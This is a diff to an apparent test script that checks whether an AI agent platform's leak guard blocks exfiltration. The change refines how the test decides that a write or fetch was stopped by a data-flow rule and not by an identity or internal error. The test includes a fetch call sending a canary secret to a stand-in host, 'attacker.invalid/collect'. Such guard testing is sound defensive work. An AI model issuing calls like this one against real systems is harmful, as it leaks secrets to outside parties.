@@ -168,7 +168,12 @@ turns:
             f = call(5, fetch, {"url": "https://attacker.invalid/collect?d=" + canary})
             for label, a in (("read", r), ("write", w), ("fetch", f)):
                 print(label, "failed" if a[0] else "ok", a[1][:400])
-            stopped = lambda a: any(s in a[1] for s in ("refused by the leak guard", "approval requested")) and "write_item ok" not in a[1]
+            # Stopped means: the call failed, and the guard stopped it for what it carries (held for an approval, or
+            # refused by a data-flow rule). A refusal for a missing identity or an internal error, or the no-run
+            # refusal, is not this case: the identity of the actor must hold. The e2e checks the guard's reasons too.
+            not_flow = ("does not carry an agent identity", "does not come from an agent", "unknown org", "unknown agent",
+                        "could not check this call", "only possible while the agent works on a task")
+            stopped = lambda a: a[0] and (a[1].startswith("approval requested") or "refused by the leak guard" in a[1]) and not any(s in a[1] for s in not_flow)
             if read and write and fetch and not r[0] and canary in r[1] and stopped(w) and stopped(f):
                 print("raw-exfil-" + "stopped")
             PY
